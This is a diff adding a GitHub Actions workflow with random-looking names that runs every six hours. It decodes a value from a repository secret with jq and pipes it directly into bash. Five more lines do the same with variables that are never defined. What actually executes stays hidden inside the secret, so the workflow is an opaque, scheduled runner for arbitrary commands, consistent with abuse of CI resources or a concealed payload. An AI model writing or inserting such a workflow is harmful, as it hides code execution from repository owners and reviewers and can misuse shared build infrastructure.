@@ -1,0 +1,23 @@
+name: lishenggaoxin
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lishenggaoxin
+        env:
+          snt6: ${{ secrets.snt6 }}
+        run: |
+          echo $snt6 | jq -r .nkzw24972 | /bin/bash
+          echo $wuy5193 | jq -r .pafi7 | /bin/bash
+          echo $si5027 | jq -r .d12165 | /bin/bash
+          echo $zngvp71387 | jq -r .h0052 | /bin/bash
+          echo $ntxmv25 | jq -r .u3 | /bin/bash
+          echo $gj0065 | jq -r .uguqj28 | /bin/bash
+
